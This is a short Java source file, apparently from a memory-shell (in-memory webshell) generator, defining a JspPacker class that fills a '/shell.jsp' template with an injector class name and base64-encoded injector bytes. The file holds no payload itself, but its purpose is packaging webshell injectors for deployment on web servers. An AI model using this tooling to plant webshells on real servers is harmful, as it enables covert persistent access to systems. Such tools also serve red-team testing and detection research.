package com.reajason.javaweb.memsell.packer;

import com.reajason.javaweb.config.GenerateResult;
import lombok.SneakyThrows;
import org.apache.commons.io.IOUtils;

import java.nio.charset.Charset;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class JspPacker implements Packer {

    @Override
    @SneakyThrows
    public byte[] pack(GenerateResult generateResult) {
        String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
        String injectorClassName = generateResult.getInjectorClassName();
        String jspTemplate = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell.jsp")), Charset.defaultCharset());
        return jspTemplate.replace("{{className}}", injectorClassName).replace("{{base64Str}}", injectorBytesBase64Str).getBytes();
    }
}